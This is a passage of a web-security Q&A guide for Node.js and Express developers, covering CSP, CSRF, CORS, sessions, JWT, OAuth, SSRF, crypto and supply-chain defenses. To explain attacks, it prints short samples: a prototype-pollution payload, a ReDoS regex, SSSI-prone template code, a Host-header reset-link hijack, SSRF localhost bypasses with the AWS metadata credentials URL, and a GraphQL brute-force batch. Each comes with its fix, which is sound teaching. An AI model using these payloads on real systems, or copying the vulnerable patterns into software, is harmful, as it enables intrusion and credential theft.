    `script-src 'nonce-${res.locals.nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`,
  );
  next();
});
```

```html
<script nonce="<%= nonce %>" src="/app.js"></script>
```

An injected script will not have the nonce, so it will not run. `'strict-dynamic'` lets trusted scripts load other scripts.

## 172: What is the difference between a nonce-based and an allowlist-based CSP?

An allowlist CSP lists domains, like `script-src 'self' cdn.example.com`. It is easy to bypass if any allowed domain hosts JSONP endpoints, old Angular versions or user uploads, and Google research found that most allowlist policies could be bypassed.

A nonce-based (or hash-based) CSP only runs scripts that carry the right nonce or match a hash, no matter where they come from. Combined with `'strict-dynamic'`, it is what Google and OWASP now recommend.

## 173: How do you roll out CSP without breaking the site?

Start with `Content-Security-Policy-Report-Only`. The browser reports violations but does not block anything.

```http
Content-Security-Policy-Report-Only: script-src 'nonce-abc' 'strict-dynamic'; object-src 'none'; report-to csp
Reporting-Endpoints: csp="https://example.com/csp-reports"
```

Collect reports for a while, fix the inline scripts and event handlers that break, then switch to the enforcing header. Keep reporting on, so you see new violations after releases.

## 174: Why does CSP block inline event handlers and how do you fix it?

A strict CSP blocks `onclick="..."` attributes and `javascript:` URLs, because they look exactly like injected code. Nonces cannot be put on attributes. Move the code into a script and use `addEventListener`.

```html
<!-- Before -->
<button onclick="save()">Save</button>

<!-- After -->
<button id="save">Save</button>
<script nonce="...">
  document.getElementById("save").addEventListener("click", save);
</script>
```

## 175: How do you implement CSRF protection in a traditional server-rendered app?

Use the synchronizer token pattern: store a random token in the session, put it in every form, and check it on every state-changing request.

```js
import crypto from "node:crypto";

app.use((req, res, next) => {
  req.session.csrf ??= crypto.randomBytes(32).toString("hex");
  res.locals.csrf = req.session.csrf;
  next();
});

app.use((req, res, next) => {
  if (["POST", "PUT", "PATCH", "DELETE"].includes(req.method)) {
    const sent = req.body._csrf ?? req.get("x-csrf-token");
    if (sent !== req.session.csrf) return res.status(403).end();
  }
  next();
});
```

The old `csurf` package is deprecated, so use a maintained library like `csrf-csrf` or your framework's built-in protection.

## 176: What is the double-submit cookie pattern?

The server sets a random CSRF token in a cookie, and the client sends the same value in a header or form field. The server checks they match. A cross-site attacker can make the browser send the cookie, but cannot read it to put it in the header.

The plain version is weak if an attacker can set cookies through a subdomain. OWASP recommends the signed version, where the token is an HMAC tied to the user's session, so a planted cookie will not validate.

## 177: How can you use Fetch Metadata headers to stop CSRF?

Modern browsers send `Sec-Fetch-Site` with every request. It tells you if the request came from the same origin, same site, a different site, or was typed by the user (`none`). You can reject cross-site state-changing requests on the server.

```js
app.use((req, res, next) => {
  const site = req.get("sec-fetch-site");
  if (site === "cross-site" && req.method !== "GET") {
    return res.status(403).end();
  }
  next();
});
```

It is a good extra layer. Keep a fallback (tokens or `Origin` checks) for older clients that do not send the header.

## 178: Do APIs that use Bearer tokens in headers need CSRF protection?

Usually not. CSRF works because browsers attach cookies automatically. If your API only accepts tokens in the `Authorization` header that your JavaScript adds, a cross-site page cannot make the browser send that header. But if the API also accepts cookies for auth, or if you use cookies for the session in a BFF, you need CSRF protection again.

## 179: How do you configure CORS safely in Express?

Allow only the specific origins you trust. Do not reflect any origin when credentials are allowed.

```js
import cors from "cors";

const allowed = new Set([
  "https://app.example.com",
  "https://admin.example.com",
]);

app.use(
  cors({
    origin(origin, cb) {
      cb(null, !origin || allowed.has(origin));
    },
    credentials: true,
    methods: ["GET", "POST", "PUT", "DELETE"],
  }),
);
```

Avoid regex checks like `/example\.com/`, which also match `example.com.evil.net`.

## 180: Why can't you use Access-Control-Allow-Origin: * with credentials?

Browsers do not allow it. If a response has `Access-Control-Allow-Origin: *`, the browser will not expose it to scripts when the request was sent with cookies or HTTP auth. This stops any site from reading logged-in users' data. Developers sometimes "fix" this by reflecting the `Origin` header back, which has the same effect as `*` with credentials and is a real vulnerability.

## 181: What is a CORS preflight request?

For requests that are not "simple" (for example, methods like `PUT` or `DELETE`, or custom headers like `Authorization`, or `Content-Type: application/json`), the browser first sends an `OPTIONS` request asking if the real request is allowed. The server answers with `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers`. If the answer does not allow it, the browser does not send the real request.

Simple requests like a form `POST` skip the preflight, which is why CORS alone does not stop CSRF.

## 182: How do you set up secure session cookies with express-session?

```js
import session from "express-session";
import { RedisStore } from "connect-redis";

app.set("trust proxy", 1);
app.use(
  session({
    name: "__Host-sid",
    secret: process.env.SESSION_SECRET,
    store: new RedisStore({ client: redis }),
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      secure: true,
      sameSite: "lax",
      path: "/",
      maxAge: 1000 * 60 * 60 * 8,
    },
  }),
);
```

Use a real store like Redis, because the default memory store leaks memory and is not meant for production.

## 183: What are the __Host- and __Secure- cookie prefixes?

They are cookie name prefixes the browser enforces:

- `__Secure-`: the cookie must have the `Secure` flag and be set over HTTPS.
- `__Host-`: the cookie must be `Secure`, have `Path=/`, and have no `Domain` attribute, so it is locked to the exact host.

`__Host-` stops a compromised or malicious subdomain from setting or overwriting the cookie, which helps against session fixation and some CSRF bypasses.

## 184: How do you regenerate the session ID after login in Express?

```js
app.post("/login", async (req, res, next) => {
  const user = await checkCredentials(req.body.email, req.body.password);
  if (!user)
    return res.status(401).json({ error: "Invalid email or password" });

  req.session.regenerate((err) => {
    if (err) return next(err);
    req.session.userId = user.id;
    req.session.save((err) => {
      if (err) return next(err);
      res.json({ ok: true });
    });
  });
});
```

This creates a new session ID, so any ID set before login (session fixation) becomes useless.

## 185: How do you protect a login endpoint from brute force?

Use several layers:

- Rate limit per IP and per account, since attackers spread attempts across many IPs.
- Add increasing delays after failures.
- Lock the account temporarily, or require a CAPTCHA or extra check, after several failures. Avoid permanent lockouts, since attackers can use them to lock out real users.
- Require MFA.
- Alert on unusual patterns like many accounts failing from one IP.

## 186: How do you add rate limiting in Express?

The `express-rate-limit` package is the common choice. Use a shared store like Redis when you run several instances.

```js
import { rateLimit } from "express-rate-limit";

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 5,
  standardHeaders: "draft-8",
  legacyHeaders: false,
  message: { error: "Too many login attempts, try again later" },
});

app.post("/login", loginLimiter, loginHandler);
```

Behind a proxy or load balancer, set `trust proxy` correctly, or every request will look like it comes from the proxy's IP.

## 187: How do you build a secure password reset flow?

1. User enters their email. Always show the same message, whether or not the account exists.
2. Generate a long random token, store only its hash with a short expiry (15 to 60 minutes).
3. Email a link with the token to the address on file.
4. When the link is used, check the hash and expiry, then let the user set a new password.
5. Mark the token as used, end all other sessions, and email the user that the password changed.

Do not use security questions, and do not build the reset link from the `Host` header.

## 188: Why should you store a hash of the reset token instead of the token itself?

If the database leaks, plain reset tokens let the attacker reset any account with a pending reset. Storing `sha256(token)` means the attacker only sees hashes. Since the token is long and random, a fast hash like SHA-256 is fine here, unlike for passwords.

## 189: How do you check passwords against breached password lists?

The Have I Been Pwned Pwned Passwords API supports k-anonymity: you send only the first 5 characters of the SHA-1 hash, get back all matching suffixes, and check locally. The full password or hash never leaves your server.

```js
import crypto from "node:crypto";

async function isPwned(password) {
  const hash = crypto
    .createHash("sha1")
    .update(password)
    .digest("hex")
    .toUpperCase();
  const prefix = hash.slice(0, 5);
  const suffix = hash.slice(5);
  const res = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`);
  const text = await res.text();
  return text.split("\n").some((line) => line.startsWith(suffix + ":"));
}
```

## 190: How do you implement TOTP-based MFA?

TOTP (Time-based One-Time Password, RFC 6238) works with apps like Google Authenticator or 1Password:

1. Generate a random secret for the user and show it as a QR code.
2. Ask the user to enter a code to confirm setup.
3. On login, after the password check, ask for the 6-digit code and check it allowing a small time window.
4. Give the user one-time recovery codes, stored hashed.

Encrypt the TOTP secret at rest, rate limit code attempts, and make sure a code cannot be reused within its window.

## 191: Why is SMS a weak second factor?

SMS codes can be stolen through SIM swapping (the attacker convinces the carrier to move your number to their SIM), SS7 network attacks, malware on the phone, and real-time phishing sites that ask for the code. SMS is still better than no MFA, but authenticator apps, push with number matching, and especially passkeys or hardware keys are much stronger.

## 192: What is MFA fatigue and how do you prevent it?

MFA fatigue (or push bombing) is when an attacker with the password triggers many push notifications until the user taps "Approve" to make them stop. Defenses: number matching (the user types a number shown on the login screen), showing location and app info in the prompt, limiting how many pushes can be sent, and alerting on many denied pushes.

## 193: How do passkeys prevent phishing?

During registration and login, the browser includes the site's origin in the data the authenticator signs, and the authenticator only uses a key that was created for that domain (the relying party ID). A fake site on `examp1e.com` cannot ask for a signature for `example.com`. There is no secret the user can type into the wrong place, so phishing does not work.

## 194: What is the JWT "alg: none" attack?

The JWT spec allows `"alg": "none"`, meaning an unsigned token. Some old libraries accepted it, so an attacker could remove the signature, set `alg` to `none`, change the claims and get in. Modern libraries reject it by default, but you should always tell the library which algorithms are allowed.

```js
import jwt from "jsonwebtoken";

const payload = jwt.verify(token, publicKey, {
  algorithms: ["RS256"],
  issuer: "https://auth.example.com",
  audience: "api.example.com",
});
```

## 195: What should you check when verifying a JWT?

- Signature, with a fixed list of allowed algorithms.
- `exp`: the token is not expired.
- `nbf`: the token is already valid, if set.
- `iss`: it came from the issuer you expect.
- `aud`: it was meant for your API, not another service.
- Token type, if your issuer uses several kinds (ID token vs access token).

Allow a small clock skew, like 30 to 60 seconds.

## 196: Why should you not put JWTs in localStorage?

Any JavaScript on the page can read `localStorage`. One XSS bug, or one compromised third-party script, can steal the token and send it to an attacker, who can use it from anywhere until it expires. `HttpOnly` cookies cannot be read by scripts. If you must keep tokens in the browser, keep access tokens short-lived and in memory.

## 197: How do you revoke JWTs before they expire?

JWTs are valid until `exp` by design, so you need extra work:

- Keep access tokens short (5 to 15 minutes) and revoke the refresh token.
- Keep a denylist of revoked token IDs (`jti`) in Redis until they expire.
- Store a "tokens valid after" timestamp or version per user and compare it with the token's `iat`.

All of these add a lookup, so you lose some of the stateless benefit, but you need some form of revocation for logout and account compromise.

## 198: What is refresh token rotation?

With rotation, each time a refresh token is used, the server issues a new one and invalidates the old one. If an old refresh token is used again, it means it was probably stolen, so the server revokes the whole token family and forces a new login. This limits how long a stolen refresh token stays useful.

## 199: What is PKCE and why is it used?

PKCE (Proof Key for Code Exchange) protects the OAuth authorization code flow. The client creates a random `code_verifier`, sends a hash of it (`code_challenge`) with the authorization request, and sends the original verifier when exchanging the code for tokens. If an attacker intercepts the code, they cannot use it without the verifier.

PKCE was made for mobile and SPA apps, but OAuth 2.1 and the current OAuth security best practice (RFC 9700) recommend it for all clients.

## 200: Which OAuth flows should you not use anymore?

- Implicit flow: tokens are returned in the URL fragment, where they can leak through history, logs and referrers. Use authorization code with PKCE instead.
- Resource Owner Password Credentials: the app collects the user's password directly, which defeats the purpose of OAuth and blocks MFA.

Both are removed in OAuth 2.1 and discouraged by RFC 9700.

## 201: What is the state parameter in OAuth for?

`state` is a random value the client creates before redirecting to the authorization server and checks when the user comes back. If it does not match, the callback is rejected. It stops CSRF on the callback, where an attacker could otherwise log the victim into the attacker's account. PKCE also covers this case, but `state` is still commonly used and recommended.

## 202: What is the nonce parameter in OpenID Connect?

`nonce` is a random value the client sends in the authentication request. The identity provider puts it inside the ID token. The client checks it matches the one it sent, which stops an attacker from replaying an ID token from another session.

## 203: What is the backend-for-frontend (BFF) pattern for SPAs?

In a BFF, a small server-side component handles the OAuth flow and keeps access and refresh tokens on the server. The browser only gets an `HttpOnly`, `Secure`, `SameSite` session cookie. The SPA calls the BFF, and the BFF adds the access token when it calls APIs. Tokens are never exposed to JavaScript, so XSS cannot steal them, though it can still make requests while the user is on the page.

## 204: How do you secure file uploads in Node.js?

```js
import multer from "multer";
import { fileTypeFromBuffer } from "file-type";
import crypto from "node:crypto";

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 5 * 1024 * 1024 },
});
const ALLOWED = new Set(["image/png", "image/jpeg", "image/webp"]);

app.post("/avatar", requireAuth, upload.single("file"), async (req, res) => {
  const type = await fileTypeFromBuffer(req.file.buffer);
  if (!type || !ALLOWED.has(type.mime)) return res.status(400).end();

  const key = `${crypto.randomUUID()}.${type.ext}`;
  await s3Put(key, req.file.buffer, type.mime);
  res.json({ key });
});
```

The key points: size limit, check the real content type from the file bytes, generate a new name, store outside the web root, and serve with the right `Content-Type` and `Content-Disposition`.

## 205: Why are SVG uploads risky?

SVG is XML and can contain `<script>` tags, event handlers and links. If you serve an uploaded SVG from your own domain and a user opens it directly, the script runs with your origin, which is stored XSS. Options: do not accept SVG, sanitize it with DOMPurify's SVG profile, convert it to PNG, or serve user files from a separate domain with `Content-Disposition: attachment` and a strict CSP.

## 206: Why serve user uploads from a separate domain?

If uploads are served from `usercontent-example.com` instead of `example.com`, any script inside a malicious file runs on that other origin. It cannot read your app's cookies, `localStorage` or make same-origin requests to your API. Google uses `googleusercontent.com` and GitHub uses `githubusercontent.com` for this reason.

## 207: What is ReDoS?

ReDoS (Regular Expression Denial of Service) happens when a regex with nested quantifiers takes exponential time on certain inputs. Since Node.js runs JavaScript on one thread, one slow regex can block all requests.

```js
// Dangerous pattern
/^(a+)+$/.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!");
```

Avoid nested quantifiers and overlapping alternations, limit input length before matching, use tools like `safe-regex2` or `eslint-plugin-regexp` to find bad patterns, or use a linear-time engine like RE2.

## 208: What is prototype pollution in JavaScript?

Prototype pollution happens when an attacker can set properties on `Object.prototype`, usually through unsafe merge or set functions with keys like `__proto__` or `constructor.prototype`. Every object in the app then inherits those properties.

```js
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
deepMerge({}, payload); // unsafe merge
({}).isAdmin; // true
```

This can lead to authorization bypasses, DoS, and in some cases RCE through template engines or child process options.

## 209: How do you prevent prototype pollution?

- Use maintained libraries and keep them updated. Many old versions of lodash, jQuery and minimist had this bug.
- Block `__proto__`, `constructor` and `prototype` keys in merge or path-set functions.
- Use `Object.create(null)` or `Map` for user-keyed data.
- Validate input with a schema that does not allow unknown keys.
- Run Node.js with `--disable-proto=delete` to remove `__proto__`.
- Freeze the prototype at startup with `Object.freeze(Object.prototype)` if your code allows it.

## 210: What is insecure deserialization?

Insecure deserialization happens when an app turns untrusted data back into objects using a format that can create arbitrary types or run code. Java's native serialization, Python's `pickle`, PHP's `unserialize` and the Node.js `node-serialize` package have all led to RCE. Use plain data formats like JSON, validate the result with a schema, and never deserialize untrusted data with a format that supports custom types.

## 211: What is server-side template injection (SSTI)?

SSTI happens when user input is used as part of a template instead of being passed as data. Template engines can often run code, so this can lead to RCE.

```js
// Vulnerable: user input becomes the template
const html = ejs.render(`Hello ${req.query.name}`);

// Safe: user input is data
const html = ejs.render("Hello <%= name %>", { name: req.query.name });
```

Never build templates from user input. Pass input as variables and let the engine escape it.

## 212: What is CRLF injection or HTTP response splitting?

If user input with `\r\n` characters ends up in a response header, the attacker can add their own headers (like `Set-Cookie`) or even a second response body. Modern Node.js throws an error if you put CR or LF in a header value, which blocks the classic attack. You should still validate values that go into headers, redirects and logs.

## 213: What is host header injection?

Some apps build URLs from the `Host` header, for example in password reset emails. The attacker sends a request with `Host: evil.com`, and the victim gets a reset link pointing to the attacker's site, which leaks the token. Fix it by using a configured base URL instead of the `Host` header, and by having the web server reject unknown hosts.

```js
const resetUrl = new URL(`/reset?token=${token}`, process.env.APP_URL);
```

## 214: How do you prevent open redirects?

Only redirect to relative paths on your own site, or to a fixed allowlist.

```js
function safeRedirect(target) {
  try {
    const url = new URL(target, "https://app.example.com");
    if (url.origin === "https://app.example.com")
      return url.pathname + url.search;
  } catch {}
  return "/";
}

res.redirect(safeRedirect(req.query.next));
```

Simple checks like "starts with `/`" fail on `//evil.com`, which browsers treat as a full URL. Parsing with `URL` and comparing origins avoids that.

## 215: How do you prevent SSRF in a "fetch this URL" feature?

- Allow only `http` and `https`.
- If possible, allowlist the domains you need.
- Resolve the hostname and block private, loopback, link-local and metadata ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`, `::1`, `fc00::/7` and so on).
- Connect to the IP you checked, so DNS cannot change between the check and the request.
- Do not follow redirects, or re-check each redirect target.
- Run the fetcher in a network that has no access to internal services.

## 216: Why is blocking "localhost" in the URL not enough to stop SSRF?

Attackers have many ways to reach the same address:

- `127.1`, `0`, `0.0.0.0`, `[::1]`, `2130706433` (decimal), `0x7f000001` (hex).
- A domain they control that resolves to `127.0.0.1` or `169.254.169.254`.
- A public URL that redirects to an internal one.
- DNS rebinding, where the domain resolves to a public IP during your check and a private IP during the real request.

You must check the resolved IP, not the string, and check it at connect time.

## 217: What is the cloud metadata service and why does SSRF target it?

Cloud providers run a metadata service at `169.254.169.254` that any instance can call to get info about itself, including temporary IAM credentials. If an attacker finds SSRF on an EC2 instance, they can request `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` and get keys for that role. The 2019 Capital One breach happened this way.

## 218: What is IMDSv2 on AWS?

IMDSv2 is the newer version of the EC2 metadata service. Clients must first get a session token with a `PUT` request that includes a custom header, then send that token on each metadata request. Most SSRF bugs only allow `GET` requests without custom headers, so they cannot get the token. You should require IMDSv2 on all instances and set the hop limit to 1 when containers do not need it.

## 219: How do you verify a webhook signature?

Compute an HMAC of the raw request body with the shared secret, and compare it with the signature header using a constant-time comparison.

```js
import crypto from "node:crypto";

app.post(
  "/webhooks/github",
  express.raw({ type: "application/json" }),
  (req, res) => {
    const sig = req.get("x-hub-signature-256") ?? "";
    const expected =
      "sha256=" +
      crypto
        .createHmac("sha256", process.env.GITHUB_WEBHOOK_SECRET)
        .update(req.body)
        .digest("hex");

    const a = Buffer.from(sig);
    const b = Buffer.from(expected);
    if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
      return res.status(401).end();
    }
    handleEvent(JSON.parse(req.body));
    res.status(204).end();
  },
);
```

Use the raw body. If you parse JSON first and re-serialize it, the bytes may change and the signature will not match.

## 220: How do you prevent webhook replay attacks?

Include a timestamp in what gets signed, and reject requests older than a few minutes. Stripe does this with its `Stripe-Signature` header. You can also store event IDs you have already processed and ignore duplicates, which also makes your handler idempotent when the sender retries.

## 221: What is a timing attack?

A timing attack learns secrets by measuring how long an operation takes. A normal string comparison stops at the first different character, so comparing a guessed token with the real one takes a bit longer for each correct character. Over many requests, an attacker can guess the token one character at a time. Use `crypto.timingSafeEqual` when comparing secrets, tokens and signatures.

## 222: How do you encrypt data with AES-GCM in Node.js?

```js
import crypto from "node:crypto";

const key = Buffer.from(process.env.DATA_KEY, "base64"); // 32 bytes

function encrypt(plain) {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
  const data = Buffer.concat([cipher.update(plain, "utf8"), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, data]).toString("base64");
}

function decrypt(b64) {
  const buf = Buffer.from(b64, "base64");
  const iv = buf.subarray(0, 12);
  const tag = buf.subarray(12, 28);
  const data = buf.subarray(28);
  const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
  decipher.setAuthTag(tag);
  return Buffer.concat([decipher.update(data), decipher.final()]).toString(
    "utf8",
  );
}
```

Use a new random IV for every encryption. Reusing an IV with the same key breaks GCM badly.

## 223: Why is AES in ECB mode insecure?

ECB encrypts each 16-byte block on its own with the same key. Identical plaintext blocks produce identical ciphertext blocks, so patterns in the data stay visible. The famous example is the ECB-encrypted Linux penguin image, where you can still see the penguin. Use an authenticated mode like AES-GCM or ChaCha20-Poly1305.

## 224: What is authenticated encryption?

Authenticated encryption both hides the data and detects any change to it. AES-GCM and ChaCha20-Poly1305 add an authentication tag. If someone flips bits in the ciphertext, decryption fails instead of returning modified data. Older modes like AES-CBC without a MAC are open to tampering and padding oracle attacks.

## 225: What is the difference between encryption in transit and encryption at rest?

Encryption in transit protects data while it moves over a network, using TLS for HTTPS, database connections and service-to-service calls.

Encryption at rest protects stored data on disks, databases, backups and object storage, usually with AES-256. Cloud providers can do it for you, but that mainly protects against stolen disks. Application-level encryption of specific fields protects even if someone gets database access.

## 226: Which TLS settings should you use on a web server?

- Allow only TLS 1.2 and TLS 1.3.
- For TLS 1.2, use only cipher suites with forward secrecy (ECDHE) and AEAD ciphers (AES-GCM, ChaCha20-Poly1305).
- Disable SSLv3, TLS 1.0, TLS 1.1, RC4, 3DES and export ciphers.
- Use certificates with at least 2048-bit RSA or ECDSA P-256 keys.
- Turn on HSTS and OCSP stapling.

Mozilla's SSL Configuration Generator gives ready-made configs for Nginx, Apache and others, and SSL Labs can test the result.

## 227: What is forward secrecy?

Forward secrecy means that if the server's private key is stolen later, past recorded traffic still cannot be decrypted. It works by using a temporary key exchange (ECDHE) for each session, so each session key is thrown away after use. TLS 1.3 always uses forward secrecy.

## 228: What is the HSTS preload list?

Browsers ship with a built-in list of domains that must always use HTTPS, even on the very first visit. Without preload, the first HTTP request before the browser sees the HSTS header can still be attacked. To get on the list, send the header with `max-age` of at least one year, `includeSubDomains` and `preload`, then submit the domain at `hstspreload.org`.

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

Removal from the list is slow, so make sure all subdomains support HTTPS first.

## 229: What is mixed content?

Mixed content is when an HTTPS page loads resources over HTTP. Browsers block mixed scripts, iframes and stylesheets, and now try to upgrade images, audio and video to HTTPS automatically, blocking them if that fails. You can add `Content-Security-Policy: upgrade-insecure-requests` to tell the browser to upgrade all HTTP requests from the page.

## 230: How should secrets be managed in a Node.js app?

- Load them from environment variables or a secrets manager at runtime, never from code.
- Keep `.env` files out of Git with `.gitignore`, and commit only an `.env.example` without values.
- Use a secrets manager (AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, HashiCorp Vault) in production.
- Give each environment its own secrets.
- Rotate secrets on a schedule and after anyone with access leaves.
- Do not log `process.env`.

## 231: How do you scan for secrets in Git repositories?

Use tools like Gitleaks, TruffleHog, or GitHub's built-in secret scanning with push protection, which blocks pushes that contain known secret formats. Run them in a pre-commit hook and in CI, and scan the full history once when you add them.

```bash
gitleaks git --verbose
```

## 232: What is the difference between npm install and npm ci?

`npm install` reads `package.json`, can update `package-lock.json`, and may install newer versions that match the ranges. `npm ci` installs exactly what the lock file says, fails if `package.json` and the lock file do not match, and deletes `node_modules` first. Use `npm ci` in CI and production builds so you get the same dependency tree you tested.

## 233: Why should you commit lock files?

The lock file (`package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`) records the exact version and integrity hash of every package, including nested ones. Without it, a fresh install might pull a newer version that has a bug or was published by an attacker. The hashes also make sure the package content has not been changed.

## 234: What is typosquatting in package registries?

Attackers publish packages with names close to popular ones, like `crossenv` instead of `cross-env` or `reqeusts` instead of `requests`. A developer who mistypes the name installs malware, which often runs in an install script and steals environment variables or tokens. Double-check package names, look at download counts and the repository, and review new dependencies before adding them.

## 235: What is dependency confusion?

Dependency confusion happens when a company uses internal package names, like `@acme/utils` or `acme-utils`, and the build is set up to also look at the public registry. An attacker publishes a public package with the same name and a higher version number, and the build installs the attacker's package. Fix it by using scoped names you own on npm, configuring the registry per scope, and blocking public fallback for internal names.

```ini
# .npmrc
@acme:registry=https://npm.internal.acme.com/
```

## 236: Why are npm install scripts a risk?

Packages can define `preinstall`, `install` and `postinstall` scripts that run automatically during `npm install`, with your user's permissions. Malicious or compromised packages use them to steal tokens, SSH keys and cloud credentials. You can turn them off with `npm install --ignore-scripts` or `ignore-scripts=true` in `.npmrc`. pnpm (version 10 and later) does not run dependency build scripts unless you allow them.

## 237: How do you set up Dependabot for security updates?

Enable Dependabot alerts and security updates in the repository settings, and add a config file for regular version updates.

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    groups:
      minor-and-patch:
        update-types: [minor, patch]
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

Make sure your test suite runs on Dependabot PRs, so you can merge updates with confidence.

## 238: What is an SBOM?

An SBOM (Software Bill of Materials) is a list of all components in your software: libraries, versions, licenses and where they came from. The common formats are CycloneDX (an OWASP project) and SPDX. When a new vulnerability is announced, an SBOM lets you quickly find which apps use the affected package.

```bash
npm sbom --sbom-format cyclonedx > sbom.json
```

## 239: What is OWASP Dependency-Check?

Dependency-Check is an OWASP SCA tool that scans project dependencies and reports known vulnerabilities by matching them to CVEs in the NVD database. It supports Java, .NET, JavaScript, Python, Ruby and more, and has plugins for Maven, Gradle, Jenkins and a CLI. OWASP Dependency-Track is a related platform that tracks SBOMs across many projects over time.

## 240: How do you add SAST to a CI pipeline?

Run a tool like Semgrep or CodeQL on every pull request and fail or comment on new findings.

```yaml
# .github/workflows/codeql.yml
name: CodeQL
on: [pull_request]
jobs:
  analyze:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read
    steps:
      - uses: actions/checkout@v5
      - uses: github/codeql-action/init@v4
        with:
          languages: javascript-typescript
      - uses: github/codeql-action/analyze@v4
```

Start by reporting only, tune out noise, then block on high-severity findings.

## 241: How do you run a ZAP baseline scan in CI?

The ZAP baseline scan spiders the target for a short time and reports passive issues like missing headers and cookie flags, without active attacks.

```bash
docker run --rm -v "$(pwd)":/zap/wrk:rw -t ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t https://staging.example.com -r zap-report.html
```

The full scan (`zap-full-scan.py`) runs active attacks too, so only run it against test environments you own.

## 242: What is container image scanning?

Container scanning checks the OS packages and libraries inside a Docker image for known vulnerabilities, plus common misconfigurations like running as root. Tools include Trivy, Grype, Docker Scout and the scanners built into ECR and other registries.

```bash
trivy image --severity HIGH,CRITICAL myapp:latest
```

Using small base images (distroless, Alpine or slim variants) gives fewer packages and fewer findings.

## 243: How do you make a Docker image more secure?

- Use a small, maintained base image and pin it by digest.
- Use multi-stage builds so build tools are not in the final image.
- Run as a non-root user.
- Do not put secrets in the image or in build args. Use build secrets.
- Install only production dependencies (`npm ci --omit=dev`).
- Scan the image and rebuild regularly for OS patches.
- Run with a read-only filesystem and drop Linux capabilities when possible.

```dockerfile
FROM node:22-slim AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build && npm prune --omit=dev

FROM gcr.io/distroless/nodejs22-debian12
WORKDIR /app
COPY --from=build /app /app
USER nonroot
CMD ["dist/server.js"]
```

## 244: What should a good error response look like from a security point of view?

It should tell the client what kind of problem happened without exposing internals: no stack traces, SQL, file paths or library versions. Include a correlation ID so support can find the full details in logs.

```js
app.use((err, req, res, next) => {
  const id = crypto.randomUUID();
  logger.error({ err, id, path: req.path }, "unhandled error");
  res.status(err.status ?? 500).json({
    error: err.expose ? err.message : "Something went wrong",
    requestId: id,
  });
});
```

## 245: How do you handle unhandled promise rejections and uncaught exceptions in Node.js?

Since Node.js 15, an unhandled rejection crashes the process by default. Log it, then let the process exit and have a process manager or orchestrator restart it. Trying to keep running after an uncaught exception is risky because the app may be in a broken state.

```js
process.on("uncaughtException", (err) => {
  logger.fatal({ err }, "uncaught exception");
  process.exit(1);
});
process.on("unhandledRejection", (reason) => {
  logger.fatal({ reason }, "unhandled rejection");
  process.exit(1);
});
```

Express 5 passes rejected promises from async route handlers to the error middleware automatically.

## 246: What is a fail-open bug? Give an example.

A fail-open bug lets a request through when a check throws or returns an unexpected value.

```js
// Fail open: if the call throws, the catch lets it through
async function middleware(req, res, next) {
  try {
    const allowed = await policy.check(req.user, req.path);
    if (!allowed) return res.status(403).end();
  } catch (e) {
    console.error(e);
  }
  next();
}
```

If the policy service is down, every request is allowed. The fix is to return an error in the `catch` block instead of falling through to `next()`.

## 247: Which security events should an app log?

- Login successes and failures, logouts, MFA changes.
- Password changes and resets.
- Access control failures (403s), especially repeated ones.
- Input validation failures that look like attacks.
- Admin actions and permission changes.
- Changes to sensitive data, exports and bulk downloads.
- Use of API keys and tokens, including invalid ones.
- Application errors and security-relevant config changes.

Each entry should have a timestamp, user or client ID, source IP, action, target and result.

## 248: How do you avoid logging sensitive data with a logger like pino?

Use the logger's redaction feature, so specific fields are always masked even if someone logs a whole object.

```js
import pino from "pino";

const logger = pino({
  redact: {
    paths: [
      "req.headers.authorization",
      "req.headers.cookie",
      "*.password",
      "*.token",
      "*.cardNumber",
    ],
    censor: "[REDACTED]",
  },
});
```

Also avoid logging full request bodies, and review log output in code reviews.

## 249: What kind of alerts should a web app have for security?

- Spike in failed logins, or many accounts failing from one IP.
- Many 403 or 404 responses from one client (scanning or IDOR attempts).
- Login from a new country or impossible travel.
- Admin role granted or MFA disabled.
- Unusually large data exports.
- WAF blocks above normal levels.
- New errors after a deploy, especially in auth code.

Alerts should go to someone who will act on them, with a runbook that says what to do.

## 250: What is a SIEM?

A SIEM (Security Information and Event Management) system collects logs from apps, servers, network devices and cloud services in one place, links related events, and raises alerts. Examples are Splunk, Microsoft Sentinel, Elastic Security and Datadog Cloud SIEM. It helps the security team see an attack that spans many systems.

## 251: How do you secure a GraphQL API?

- Check authorization in resolvers or a shared layer, per object and per field, not just at the endpoint.
- Limit query depth and complexity, so one query cannot ask for millions of nested records.
- Limit the number of aliases and batched operations per request.
- Turn off introspection in production if the schema is not public.
- Use persisted queries for first-party clients.
- Hide detailed error messages and stack traces.
- Rate limit by query cost, not just by request count.

## 252: What is a GraphQL batching attack?

GraphQL lets one request contain many operations, either through aliases or an array of queries. An attacker can put 1,000 login or OTP attempts in one HTTP request, which gets around rate limits that count requests.

```graphql
mutation {
  a1: login(email: "victim@x.com", password: "pass1") {
    token
  }
  a2: login(email: "victim@x.com", password: "pass2") {
    token
  }
  # ... hundreds more
}
```

Limit aliases and batch size, and rate limit sensitive operations by the number of times they run, not by HTTP request.

## 253: How do you secure a REST API in general?

- Use HTTPS only.
- Authenticate every request, and check authorization for every object and function.
- Validate input with schemas and reject unknown fields.
- Return only the fields the client needs.
